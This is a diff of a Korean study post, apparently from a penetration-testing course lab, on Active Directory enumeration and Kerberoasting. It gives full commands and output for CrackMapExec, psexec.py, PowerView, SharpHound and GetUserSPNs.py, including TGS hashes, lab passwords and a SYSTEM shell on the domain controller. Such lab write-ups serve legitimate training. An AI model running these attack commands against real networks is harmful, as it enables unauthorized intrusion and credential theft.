@@ -2,27 +2,27 @@
 title: "Active Directory - Credentialed Enumeration and Kerberos Attacks"
 date: 2026-08-04
 layout: single
-excerpt: "Windows 환경에서 파일, 브라우저, 레지스트리, 저장된 세션, 백업, 클립보드 등을 통해 자격 증명을 수집하고, 사용자 상호작용 및 다양한 추가 기법을 활용해 권한 상승과 횡적 이동으로 이어지는 공격 흐름을 실습한다."
+excerpt: "Active Directory 환경에서 확보한 자격 증명으로 SMB, LDAP, PowerView, BloodHound 기반 열거를 수행하고, 로그온 사용자와 권한 경로를 분석한 뒤 Impacket, NetExec, Rubeus를 이용한 Kerberoasting으로 고권한 서비스 계정까지 확장하는 과정을 정리한다."
 author_profile: true
 toc: true
 toc_label: "Active Directory"
 toc_icon: "book"
 toc_sticky: true
 categories: [cpts-infra]
-tags: [windows, cpts, priv-esc, credential-theft, pillaging, lateral-movement, registry, browser-credentials, scheduled-tasks]
-
-published: false
+tags: [cpts, active-directory, kerberos, kerberoasting, enumeration]
 ---
+
+Active Directory 환경에서 확보한 자격 증명으로 SMB, LDAP, PowerView, BloodHound 기반 열거를 수행하고, 로그온 사용자와 권한 경로를 분석한 뒤 Impacket, NetExec, Rubeus를 이용한 Kerberoasting으로 고권한 서비스 계정까지 확장하는 과정을 정리한다.
 
 # Deeper Down the Rabbit Hole
 
-## Credentialed Enumeration - from Linux
+패스워드 스프레이와 기본 열거를 통해 몇 개의 유효한 계정을 확보했으므로, 이제 자격 증명을 활용해 내부 환경을 더 깊게 열거하고 낮은 권한에서 높은 권한으로 이어질 수 있는 경로를 찾아본다.
 
-이제 스프레이 열거도 쳐 해봤고 계정 몇개 찾았으니 낮은 권한에서 높은 권한으로 이동할 차례이다.
+Linux에서는 CrackMapExec/NetExec 계열 도구를 활용하면 SMB, LDAP 등의 서비스를 기준으로 호스트와 권한을 빠르게 확인할 수 있다.
 
-이제 가장 ad에서 열거를 할때 중요한 nxc 툴을 활용하여 내부를 깊게 분석할수가있다.
+### SMB Enumeration and Local Admin Access
 
-우선 전에 했던 wley 기준으로 열거를 진행하였다:
+우선 이전에 확보한 `wley` 계정을 기준으로 SMB 열거를 진행하였다:
 
 ```bash
 $ crackmapexec smb 172.16.5.0/23 -u wley -p transporter@4         
@@ -34,13 +34,13 @@ SMB         172.16.5.130    445    ACADEMY-EA-FILE  [*] Windows 10.0 Build 17763
 SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] INLANEFREIGHT.LOCAL\wley:transporter@4 (Pwn3d!)
 ```
 
-이 처럼 `172.16.5.130` ip에서 Pwn3d!가 떴다. 이뜻은 현재 wley 유저가 관리자 권한과 비슷한 권한을 가지고 있음을 뜻한다.
+`172.16.5.130` 에서 `Pwn3d!` 가 표시되었다. 이는 `wley` 자격 증명이 해당 호스트에서 관리자 권한으로 인증되었음을 의미한다.
 
-또한 현재 `INLANEFREIGHT.LOCAL` 도메인의 `ACADEMY-EA-FILE` 관련 서버임을 알수있다.
+또한 해당 호스트는 `INLANEFREIGHT.LOCAL` 도메인에 가입된 `ACADEMY-EA-FILE` 서버임을 확인할 수 있다.
 
-따라서 현재 445 기반의 psexec.py 툴을 활용하여 wley 서버로 이동할수있는 상태일수도있다.
+따라서 SMB 445/TCP를 통해 원격 서비스 생성이 가능한 경우 `psexec.py` 를 이용해 명령 실행을 시도할 수 있다.
 
-툴을 실행시켜 들어가보았다:
+실제로 접속을 시도하였다:
 
 ```bash
 $ psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.130                                              
@@ -52,9 +52,11 @@ C:\Windows\system32>whoami
 nt authority\system
 ```
 
-이처럼 현재 wley는 시스템 계정임을 확인할수있었다.
+`psexec.py` 가 관리자 권한을 이용해 원격 서비스를 생성하고 그 서비스를 `NT AUTHORITY\SYSTEM` 으로 실행했기 때문에 SYSTEM 셸이 반환되었다.
 
-또한 현재 로그인된 사용자도 볼수있다:
+### Logged-on User Enumeration
+
+추가로 해당 호스트에 존재하는 로그온 세션도 열거할 수 있다:
 
 ```bash
 $ crackmapexec smb 172.16.5.130 -u wley -p transporter@4 --loggedon-users               
@@ -74,11 +76,15 @@ SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\forend        
 SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\svc_qualys                logon_server: ACADEMY-EA-DC01
 ```
 
-현재 이처럼 여러 사용자들이 로그인을 했다는것을 확인할수있다.
+출력에는 여러 도메인 계정의 로그온 정보가 나타난다. 
 
-또한 방금 봤다시피 `ACADEMY-EA-DC01` 서버는 172.16.5.5 호스트였으며, 전에 nmap을 ad 서비스를 하고있음을 확인하였었다.
+다만 `--loggedon-users` 결과에는 대화형 로그인뿐 아니라 서비스나 기타 로그온 세션이 포함될 수 있고, 동일 계정이 중복해서 보일 수도 있다.
 
-따라서 -u wley -p transporter@4 유저를 통하여 ldap에 관한이 존재하는지 확인하였따:
+### LDAP and Domain Admin Enumeration
+
+앞에서 확인한 `ACADEMY-EA-DC01` 은 `172.16.5.5` 이며, Nmap 결과를 통해 LDAP를 포함한 Active Directory 서비스가 동작하고 있음을 확인하였다.
+
+따라서 `wley` 자격 증명으로 LDAP 바인드가 가능한지 확인하였다:
 
 ```bash
 $ crackmapexec ldap 172.16.5.5 -u wley -p transporter@4  
@@ -87,9 +93,11 @@ LDAP        172.16.5.5      389    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763
 LDAP        172.16.5.5      389    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\wley:transporter@4
 ```
 
-이처럼 ldap 권한이 존재하며 이를 대상으로 bloodhound를 추출할수있게된다.
+정상적으로 LDAP 인증이 성공하였다. 
 
-또한 추가로 wind 툴을 사용하여 ldap를 직접 열거해 172.16.5.5 서버의 domain admin 사용자명들을 추출할수있다:
+즉, `wley` 계정으로 LDAP를 조회할 수 있으며 계정에 허용된 범위 안에서 AD 객체를 열거하거나 BloodHound 수집을 수행할 수 있다.
+
+추가로 [windapsearch](https://github.com/ropnop/windapsearch)를 사용하여 LDAP를 직접 조회하고 Domain Admins 구성원을 열거할 수 있다:
 
 ```bash
 $ python3 windapsearch.py --dc-ip 172.16.5.5 -u wley@inlanefreight.local -p transporter@4 --da      
@@ -173,15 +181,17 @@ cn: sqldev
 cn: svc_qualys
 ```
 
-신기한점은 아까 봤던 172.16.5.130 호스트에 존재했던 로그인된 사용자와 도메인 어드민이라고 하는 svc_qualys 유저가 동일하다.
+여기서 눈여겨볼 점은 `ACADEMY-EA-FILE` 의 로그온 정보에서 확인했던 `svc_qualys` 계정이 Domain Admins 열거 결과에도 포함되어 있다는 것이다.
 
-따라서 파일 서버에서 svc_qualys 유저의 자격증명이 발견되고, 똑같이 172.16.5.5 서버에 재사용된다면 도메인 어드민을 먹을수있게된다.
+따라서 파일 서버에서 `svc_qualys` 의 재사용 가능한 자격 증명이나 인증 재료를 확보할 수 있다면, 해당 Domain Admin 권한을 이용해 도메인 전체로 권한을 확장할 가능성이 생긴다.
 
 ## Credentialed Enumeration - from Windows
 
-윈도우에서 열거를 하는데 가장 대표적인 모듈은 [ActiveDirectory](https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2025-ps) 모듈이 존재한다.
+### ActiveDirectory Module
 
-이 모듈의 명령어를 볼려면 이런식으로 볼수있따:
+Windows에서는 Microsoft의 [ActiveDirectory](https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2025-ps) PowerShell 모듈을 사용하여 AD 객체를 직접 열거할 수 있다.
+
+모듈에서 제공하는 명령어는 다음과 같이 확인할 수 있다:
 
 ```powershell
 PS C:\Users\htb-student> get-command -module activedirectory
@@ -193,23 +203,23 @@ Cmdlet          Add-ADComputerServiceAccount                       1.0.1.0    ac
 Cmdlet          Add-ADDomainControllerPasswordReplicationPolicy    1.0.1.0    activedirectory
 ```
 
-내부에 어떤 도메인이 존재하는지 확인할수있다:
+먼저 현재 도메인의 기본 정보를 확인할 수 있다:
 
 ![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad1.png)
 
-또한 spn이 설정되어있는 user들도 가져올수있따:
+또한 SPN이 설정된 사용자 계정을 열거할 수 있다:
 
 ![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad2.png)
 
-이렇게 spn이 설정되어있으면 서비스 계정으로 인식하여 켈베로스팅 공격에 악용될수가있다.
+사용자 계정에 SPN이 등록되어 있다면 Kerberoasting의 대상이 될 수 있다.
 
-그리고 trust 설정을 통해 또다른 도메인이 존재하는지 확인할수있다:
+Trust 정보를 확인하면 현재 도메인과 신뢰 관계를 맺고 있는 다른 도메인이나 포레스트도 확인할 수 있다:
 
 ![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad3.png)
 
-이처럼 어떤 도메인이 있는지 확인할수잇으며, 확장해나갈수있다.
+이 결과를 통해 현재 도메인 외에 어떤 신뢰 관계가 존재하는지 확인하고 열거 범위를 확장할 수 있다.
 
-또한 어떤 그룹이 있는지 확인하고, 그 그룹 대상으로 어떤 유저들이 있는지 확인할수있다:
+또한 그룹 목록과 특정 그룹의 구성원을 확인할 수 있다:
 
 ```powershell
 PS C:\Users\htb-student> Get-ADGroup -Filter * | select name
@@ -217,35 +227,39 @@ PS C:\Users\htb-student> Get-ADGroup -Filter * | select name
 PS C:\Users\htb-student> Get-ADGroupMember -Identity "Backup Operators"
 ```
 
-또한 윈도우디렉토리 모듈이 아닌 파우ㅏ뷰 모듈도 있다.
+### PowerView and Trust Enumeration
 
-우선 powerview 모듈을 임포트한다:
+ActiveDirectory 모듈 외에도 AD 열거에 널리 사용되는 PowerView가 존재한다.
+
+우선 PowerView 모듈을 임포트한다:
 
 ```powershell
 PS C:\Tools> Import-Module .\PowerView.ps1
 ```
 
-그후 이처럼 어떤 유저가 있는지를 볼수있따:
+이후 특정 사용자 정보를 열거할 수 있다:
 
 ![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad4.png)
 
-또한 이처럼 domain admins 에 어떤 유저들이 존재하는지 확인할수있다:
+또한 `Domain Admins` 그룹의 구성원을 재귀적으로 확인할 수 있다:
 
 ![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad5.png)
 
-이처럼 재귀적으로 펼친다음 각각 어떤 유저들이 어떤 도메인에서 도메인 어드민인지 확인할수있게된다.
+재귀 열거를 사용하면 직접 구성원뿐 아니라 중첩된 그룹을 통해 Domain Admins 권한을 상속받는 사용자까지 확인할 수 있다.
 
-또한 화살표에 표시된것처럼 domain admin에 속한다기보단 간접적으로 도메인 어드민 아래의 secadmins라는 그룹이 있따.
+예를 들어 화면의 `Secadmins` 그룹은 `Domain Admins` 에 중첩되어 있으며, 그 안의 사용자들은 해당 중첩 멤버십을 통해 Domain Admins의 권한을 갖게 된다.
 
-이들은 중첩적으로 domain admin에 존재하는것과 동일하다.
+즉, 사용자가 `Domain Admins` 에 직접 추가되어 있지 않더라도 중첩 그룹 경로를 통해 동일한 고권한을 가질 수 있다.
 
-또한 어떤 도메인이있는지확인할수잇다:
+PowerView를 이용해 도메인 Trust 관계도 확인할 수 있다:
 
 ![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad6.png)
 
-이처럼현재 다른 Forest인 FREIGHTLOGISTICS.LOCAL가 존재하고 같은 포레스트인 LOGISTICS.INLANEFREIGHT.LOCAL가 존재한다.
+결과를 보면 `LOGISTICS.INLANEFREIGHT.LOCAL` 은 동일한 `INLANEFREIGHT.LOCAL` 포레스트 내부의 자식 도메인이며, `FREIGHTLOGISTICS.LOCAL` 은 별도의 포레스트와 맺어진 Forest Trust 관계임을 확인할 수 있다.
 
-또한 저런 열거가 아닌 각각 암호, SSH 키, 구성 파일 또는 기타 데이터들을 캐오는 스내플러exe 도구도 존재한다:
+### Snaffler
+
+AD 객체 열거뿐 아니라 공유 폴더에서 암호, SSH 키, 구성 파일 등 민감한 파일을 탐색하는 `Snaffler.exe` 도 사용할 수 있다:
 
 ```powershell
 PS C:\Tools> .\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data
@@ -267,33 +281,39 @@ PS C:\Tools> .\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data
 # SKIP
 ```
 
-이처럼 공유 디렉토리들을 찾아서 어떤 파일들이 존재하는지를 확인할수있게된다.
+이처럼 Snaffler는 접근 가능한 공유 디렉터리를 탐색하고 관심 있는 확장자나 파일 패턴을 찾아준다.
 
-공유 파일의 webconf.ig 같은게 저장되있을수도있으며, ㄱ ㅡ파일을 읽어 웹의 자격증명을 가져올수도있게된다.
+예를 들어 `web.config` 같은 구성 파일이나 키 파일에 자격 증명 또는 비밀 값이 저장되어 있다면 추가적인 자격 증명 확보로 이어질 수 있다.
 
-또한 sharphound(bloodhound) 도 존재한다.
+### BloodHound and SharpHound
 
-이를 활용해서 각 객체의 권한들을 시각적으로 보여주어 각 객체의 어떤 침해를 가할수있고 권한상승에 관련하여 뭘 할수있게된다.
+AD 객체 간 권한 관계를 시각적으로 분석하기 위해 SharpHound/BloodHound도 사용할 수 있다.
 
-우선 데이터를 추출받았다:
+SharpHound로 수집한 데이터를 BloodHound에 넣으면 사용자, 그룹, 컴퓨터, ACL 등의 관계를 그래프로 확인하고 권한 상승 경로를 분석할 수 있다.
+
+우선 데이터를 수집하였다:
 
 ```powershell
 PS C:\Tools> .\SharpHound.exe -c All
 ```
 
-이후 wley를 예를들어서 보게되면ㅇ ㅣ처럼 권한관계까 잡혀있다:
+이후 `wley` 를 기준으로 조회하면 다음과 같이 권한 관계가 나타난다:
 
 ![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad7.png)
 
-이처럼 어떤 유저에게 비밀번호 변경권한이 주어져있었으며 이렇게 권한상승을 통하여 최종적으로 도메인 관리자까지 갈수있는수단이존재학덷괴낟.
+예를 들어 `wley` 가 `damundsen` 에 대해 `ForceChangePassword` 권한을 가지고 있음을 확인할 수 있다. 
+
+이러한 ACL 관계를 다른 그룹 및 사용자 권한과 연결하면 최종적으로 더 높은 권한으로 이어지는 공격 경로를 찾을 수 있다.
 
 ## Living Off the Land
 
-이전까지는 PowerView, BloodHound 같은 외부 도구를 가져와서 AD를 열거했다면, 여기서는 인터넷도 없고 툴 업로드도 실패한 관리형 Windows 호스트라고 가정해보자.
+이전까지는 PowerView, BloodHound 같은 외부 도구를 사용했지만, 여기서는 인터넷 접근이나 추가 도구 업로드가 제한된 Windows 호스트에서 기본 제공 기능만으로 열거한다고 가정한다.
 
-우선 내부 기본 명령어를 통하여 초기 열거가 가능하다.
+### Host and Network Information
 
-이처럼 ifconfig 를 통하여 전역을 볼수있으며:
+먼저 운영체제에 기본 포함된 명령어로 호스트와 네트워크 정보를 확인할 수 있다.
+
+`ipconfig /all` 을 사용하면 호스트명, 도메인, NIC, IP 주소, DNS 서버, 게이트웨이 등의 정보를 확인할 수 있다:
 
 ```powershell
 *Evil-WinRM* PS C:\Users\htb-student> ipconfig /all
@@ -346,9 +366,9 @@ Ethernet adapter Ethernet0:
    NetBIOS over Tcpip. . . . . . . . : Enabled
 ```
 
-이처럼 현재 환경은 `ACADEMY-EA-MS01` 호스트임을 알수있따.
+이를 통해 현재 호스트가 `ACADEMY-EA-MS01` 이며 `INLANEFREIGHT.LOCAL` 도메인에 가입되어 있고, `172.16.5.25` 와 `10.129.109.121` 두 네트워크 인터페이스를 가지고 있음을 확인할 수 있다.
 
-설치된 Windows 패치/Hotfix 목록 확인할수도있따:
+설치된 Windows 패치와 Hotfix 목록도 확인할 수 있다:
 
 ```powershell
 *Evil-WinRM* PS C:\Users\htb-student> wmic qfe get Caption,Description,HotFixID,InstalledOn
@@ -357,7 +377,7 @@ Caption                                     Description  HotFixID   InstalledOn
 http://support.microsoft.com/?kbid=4464455  Update       KB4464455  10/29/2018
 ```
 
-그리고 필요없이 하나하나 열거보단 아래처럼 작성하여 쭉 현 호스트의 정보를 훑어볼수있다:
+개별 항목을 하나씩 확인하는 대신 `systeminfo` 를 사용하면 OS 버전, 도메인, Hotfix, 네트워크 인터페이스 등 현재 호스트의 주요 정보를 한 번에 확인할 수 있다:
 
 ```powershell
 *Evil-WinRM* PS C:\Users\htb-student> systeminfo
@@ -414,7 +434,9 @@ Network Card(s):           2 NIC(s) Installed.
 Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
 ```
 
-또한 현 호스트의 방화벽 상태를 확인할수있다:
+### Security Controls
+
+또한 현재 호스트의 Windows Firewall 상태를 확인할 수 있다:
 
 ```powershell
 PS C:\Users\htb-student> netsh advfirewall show allprofiles
@@ -438,9 +460,11 @@ MaxFileSize                           4096
 # SKIP
 ```
 
-이처럼 현재 도ㅓ메인 네트워크에선 설정값 자체는 존재하지만 state값이 off이므로 현재는 적용되지 않는 상태임을 의미한다.
+출력에서 Domain Profile의 `State` 가 `OFF` 이므로 해당 프로필의 방화벽 필터링은 현재 비활성화된 상태이다. 
 
-또한 현재 디펜더가 실행중인지 확인할수도있다 (아래는 HTB에서 가져온거):
+`Firewall Policy` 값이 표시되더라도 프로필 자체가 꺼져 있다면 그 정책은 현재 적용되지 않는다.
+
+Microsoft Defender 서비스의 실행 상태도 확인할 수 있다:
 
 ```powershell
 PS C:\Users\htb-student> sc query windefend
@@ -455,47 +479,55 @@ SERVICE_NAME: windefend
         WAIT_HINT          : 0x0
 ```
 
-그리고 그 디펜더의 상세를 보기위해 [](https://learn.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?view=windowsserver2025-ps) 툴을 사용할수있다:
+Defender의 세부 보호 상태는 [Get-MpComputerStatus](https://learn.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?view=windowsserver2025-ps)로 확인할 수 있다:
 
 ![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad8.png)
 
-현재 not runiong 상태이며 동작하지 않는다.
+`WinDefend` 서비스 자체는 `RUNNING` 이지만, 화면에서는 `AMRunningMode` 가 `Not running` 이고 `RealTimeProtectionEnabled` 도 `False` 로 나타난다. 
 
-또한 qwinsta를 사용하여 나 말고 누군가 들어왔는지 확인하는 방법도 존재한다:
+즉, 서비스 프로세스가 존재하는 것과 실제 실시간 보호가 활성화되어 있는지는 별개로 확인해야 한다.
+
+### Sessions and Network Discovery
+
+`qwinsta` 를 사용하면 현재 호스트의 터미널 세션과 RDP 세션 상태를 확인할 수 있다:
 
 ![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad9.png)
 
-만약 몰래 침투하는 작업을 수행할때 누군가 존재한다면 발칵 위험이 존재하기에 확인하고 하는 방식이며, 로그인 사용자를 타겟으로 피싱이 가능할수도있다.
+이를 통해 다른 사용자의 활성 세션이 있는지 확인할 수 있으며, 침투 테스트 중 사용자 활동과 충돌할 가능성을 줄이거나 현재 사용 중인 계정을 파악하는 데 참고할 수 있다.
 
-또한 arp를 이용해서 각 이 호스트에서 통신을 주고받은 다른 호스트가 누구인지, 또는 같은 네트워크 안에서 어떤 서버가 존재하는지 파악하는데 사용된다:
+`arp -a` 는 현재 호스트의 ARP 캐시에 저장된 동일 L2 네트워크의 인접 IP와 MAC 주소를 확인하는 데 사용할 수 있다:
 
 ![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad10.png)
 
-route도 마찬가지다:
+`route print` 를 이용하면 로컬 라우팅 테이블을 확인할 수 있다:
 
 ![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad11.png)
 
-보게되면 그냥 내부엔 172~ 밖에 없는 소규모 환경이거나, 폐쇄망일 가능성이 존재한다.
+여기서는 `172.16.4.0/23` 과 `10.129.0.0/16` 이 직접 연결된 네트워크로 보이며, 기본 게이트웨이도 확인할 수 있다. 
 
-이제 방금 봤다시피 다른 툴을 불러올수없는 상태라면, 그 대체제인 [](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic)와, [](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/net-commands-on-operating-systems)를 사용할수있다.
+### Native Tools and LDAP Filters
 
-그리고 ldap에 필터링 검사가 있다.
+외부 도구를 가져올 수 없는 환경에서는 [WMIC](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic), `net.exe`, `sc.exe`, `ipconfig`, `arp`, `route` 같은 기본 도구를 조합하여 상당 부분의 초기 열거를 수행할 수 있다. 
 
-이 필터링은 ldapsearch와 dnsquery 같은 툴을 사용할때 필터링을 작성해서 정보를 캐내오기도한다.
+또한 LDAP 검색에서는 Search Filter를 사용하여 원하는 객체나 속성을 조건에 맞게 조회할 수 있다.
 
-그 필터링 정보는 [](https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax)에서 확인할수있따.
+예를 들어 LDAP 쿼리에서 사용자, 그룹, SPN 보유 계정 등의 조건을 필터로 지정하여 필요한 객체만 추출할 수 있다.
+
+LDAP 검색 필터 문법은 Microsoft의 [LDAP Search Filter Syntax](https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax) 문서에서 확인할 수 있다.
 
 # Cooking with Fire
 
 ## Kerberoasting - from Linux
 
-위에서 봤다시피 spn이 설정된 유저들이존재했었다.
+### SPN Enumeration
 
-이 spn이 달려있으면 dc는 저 유저들을 서비스로 인식하여 dc가 직접 tgs기능을 이용해 그 spn 달린 유저에 해당하는 해쉬 문자열을 보내주게된다.
+앞에서 SPN이 설정된 사용자 계정들이 존재하는 것을 확인하였다.
 
-이 공격 기법을 악용한게 바로 켈벨로스팅이다.
+Kerberos에서 클라이언트가 특정 SPN의 서비스 티켓(TGS)을 요청하면 KDC는 해당 서비스 계정의 장기 키로 암호화된 티켓을 발급한다. Kerberoasting은 이 티켓의 암호화된 부분을 가져와 오프라인에서 서비스 계정의 비밀번호를 추측하는 공격이다.
 
-따라서 내부에서 getspanspn을 사용할수있다:
+따라서 공격자가 도메인 사용자 자격 증명을 가지고 있다면 SPN이 등록된 사용자 계정을 열거하고 서비스 티켓을 요청할 수 있다.
+
+Linux에서는 Impacket의 `GetUserSPNs.py` 를 사용할 수 있다:
 
 ```bash
 $ GetUserSPNs.py INLANEFREIGHT.LOCAL/wley:'transporter@4' -dc-ip 172.16.5.5                                    
@@ -517,11 +549,13 @@ vmware/inlanefreight.local                         svc_vmwaresso                
 SAPService/srv01.inlanefreight.local               SAPService         CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL                                 2022-04-18 14:40:02.959792  <never>  
 ```
 
-이렇게 spn 애들이 나오게된다.
+이처럼 SPN이 등록된 사용자 계정과 서비스 정보를 확인할 수 있다.
 
-이 상태에서 -request 옵션을 쓰게되면 저 spn 애들의 해쉬들이 나오게된다.
+### Requesting Service Tickets
 
--request-user를 통하여 한 사용자만 지정할수있긴한다:
+`-request` 옵션을 사용하면 열거된 계정에 대해 실제 서비스 티켓을 요청하고, 오프라인 크랙에 사용할 수 있는 `$krb5tgs$...` 형식으로 출력할 수 있다.
+
+특정 사용자만 대상으로 지정하려면 `-request-user` 를 사용할 수 있다:
 
 ```bash
 $ GetUserSPNs.py INLANEFREIGHT.LOCAL/wley:'transporter@4' -dc-ip 172.16.5.5 -request-user testspn              
@@ -533,9 +567,9 @@ testspn/kerberoast.inlanefreight.local  testspn            2022-02-27 15:15:43.4
 $krb5tgs$18$testspn$INLANEFREIGHT.LOCAL$*INLANEFREIGHT.LOCAL/testspn*$28ff39fcd75c4a2a5977eff1$cbccf581d475d175e727580a76d3234334610da8be8cfcd3b333e647e1ed909b1c31de2cb520ce36a63e81b36bc6a8bdbdfd33d3ce41f5fc31dd2f4dbe9dd7a90bbfc90a26339c16b4a31976f6d9f821bd492cf97d806c48e700a2e88457565ed5ee82c1e3bf59d967d8d18f1dd32bb6726b08c3b6a4981143f98abc15b4c51584c70dcf0f40891806d5acf153da6a754333e0c177bf808d2a1af2ec19f0f313b7fa46f7ffaa5a5913cb26b305d8b210335b32c450d7b8bcb81adb7ec0ed690253a46c2451cb99b1ab243e484658a4f0fd2848b901047b23e5fec09fc8ff96d5e1a0ee6cbe29fac7b9f9c1ba5555e09993cfcb98d4388e7147d726e24890b483eef8e016173078368dbe130cf8231c7d79508ae58ed40f4a9e8925cd8567d5bd6046423ad0411250cbe86c72e2edc392151363e0a50f50109cbf9c55f8d2931d9a3d505af3746c3689c841dd4e2cc0cca935468d865e8e715040f2b6713c623d614fa7626fb7ae655131bea683eaa72fde916caf2da7279752388de66fc3334fdc49c83fcae6d90eb0940a09a6081bf74dbd1cee1862b80ac396025b95a82d24c37c51d0ead6a60813d33ab2a68ec11c8c3a2c2422d7e0d93c62bff3f5d5ea16bb37152df6bab2f5e5bcb84c999b62fe2961509e04dd386f20c286a41f23d6df3b8e21262ce68691c3443206049035e9703970f8e8ef0b42d1cce1a860dd34adec8b7b611f656b71e90c914a317af0838a4dc9ee639f8fe8a94967e66d6ee39261aefd44dab9506b12f2606bbb636841d1615880b8bfaf69cc6dfc30cd56a0c124083be1a3fd8f1d4e8a0ed4298a28d27bb4be7c87fa663d4f5ce15133d7321062499aeee29d609258320ef2d7826806d6ffef45e2519d3e29ab2863bf5c5b66ad220d0681c41162f99e91047837e351b4a43f1d8c682e80ae51a133056eb63269df7109512e30c56356ec02d8c06ea5669841bdc476419079c3ab310a10b2678761dc9d2c74c65361e50790db0dbba32deba93b9f0860dca3318573536d467c2f5b88f65f3ca401732fc9508ebccb978fb84ddd70f42e68c543e63af102bbcd12e12fd7d71d945e452e0fcb927874ac04367a55ae896040a377254e3223ae99af16be118c09fde4c793b97d746ef81a022216440ad993a5c532dabe1dbc2f7f5fe1839ef758a0455fb8370bf6311fcfe9b4a0defa41a9442adf2f0e61ed2bc195a8175475cadad4fedf64d3af2ab3156a042dccb3e3dc01e9ad9e0952a92b2136e369da62feadbccc89eae2857725747289b309636673c8942a00d53bd52bd70d677cf221f64b3fa9491519a82cdb99aa1d4d28fd1c7888256d62cbd2560b3ef6886132e9117ccd5ea3dc562b5a73a9afed88486d8a7efcfa7632836489b4077661c31e1a7c69892c183ef0116033f7ee033502d8a28656b6911f789a389e77e97c6d3df6f7bd52
 ```
 
-이제 이를 토대로 해독할수있다.
+출력된 `$krb5tgs$...` 값은 암호화 방식에 맞는 Hashcat/John 모드로 오프라인 크랙을 시도할 수 있다.
 
-도한 nxc를 이용하여 빠르게 spn달린 사용자의 모든 유저를 빼올수도있다:
+또한 CrackMapExec의 Kerberoasting 기능을 이용하면 SPN 계정을 빠르게 열거하고 서비스 티켓을 요청할 수도 있다:
 
 ```bash
 $ crackmapexec ldap 172.16.5.5 -u wley -p 'transporter@4' --kerberoasting spnuser
@@ -546,28 +580,29 @@ LDAP        172.16.5.5      389    ACADEMY-EA-DC01  sAMAccountName: damundsen me
 LDAP        172.16.5.5      389    ACADEMY-EA-DC01  $krb5tgs$23$*damundsen$INLANEFREIGHT.LOCAL$MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL~1433*$c80a7de11740dbf1c4b56dc35d84037b$07eef5a5efadc1e67c89aba437ce3bc35e9c1e0909b9e2df23d58bea017aa21f8bfb5eaf32dd5d6e4467e8be0e640e38e18902405b804b6874f940b9ff9a93be79e73f6b634bb9cf6111dd20dd0268658181f4bb8e204f12050fec453bb147bd1127b645dcfcdde4f54e5f807b8dc395ac7f60c14
 ```
 
-여러 사용자를 크랙하던중 위 spn에 해당하는 sqldev 유저의  크랙이 가능했었다.
+### Cracking and Privilege Validation
 
-계정명은 이러하다:
+여러 서비스 계정을 대상으로 오프라인 크랙을 진행하던 중 `sqldev` 계정의 비밀번호를 복구할 수 있었다.
+
+확보한 자격 증명은 다음과 같다:
 
 ```text
 sqldev:database!
 ```
 
-근데 뒤지게 쳐 웃긴게 방금 도메인 어드민 열거했을때 sqldev 유저가 도메인 어드민 그룹에 가입되어있었다
+앞서 Domain Admins 구성원을 열거했을 때 `sqldev` 가 해당 그룹에 포함되어 있었으므로, 이 자격 증명은 일반 서비스 계정보다 훨씬 높은 가치가 있다.
 
-nxc로 보았다:
+먼저 WinRM 인증을 확인하였다:
 
 ```bash
-$ crackmapexec winrm 172.16.5.5 -u sqldev -p 'database!'                                                       
+$ crackmapexec winrm 172.16.5.5 -u sqldev -p 'database!'     
+
 WINRM       172.16.5.5      5985   ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL)
 WINRM       172.16.5.5      5985   ACADEMY-EA-DC01  [*] http://172.16.5.5:5985/wsman
 WINRM       172.16.5.5      5985   ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\sqldev:database! (Pwn3d!)
 ```
 
-흠 이렇게 wim으로 들어갈수있고 pwn3d가 떴다 얘는 관리자라는 뜻이다.
-
-혹시모르니 접속해봄:
+실제로 원격 명령 실행이 가능한지 `psexec.py` 로 확인하였다:
 
 ```bash
 $ psexec.py 'INLANEFREIGHT.LOCAL/sqldev:database!@172.16.5.5'
@@ -579,31 +614,35 @@ C:\Windows\system32>whoami
 nt authority\system
 ```
 
-이처럼 dc01에서 system 권한을 획득했다.
+이처럼 DC01에서 `NT AUTHORITY\SYSTEM` 권한의 셸을 획득하였다.
 
-이정도면 그냥 도메인 어드민 먹힌거나 다름없다.
+또한 `sqldev` 자체가 Domain Admins 구성원이므로 이 시점에서는 사실상 도메인 전체가 침해된 것으로 볼 수 있다.
 
 ## Kerberoasting - Windows
 
-윈도우에서 크랙이 가능하다.
+### PowerView and SetSPN
 
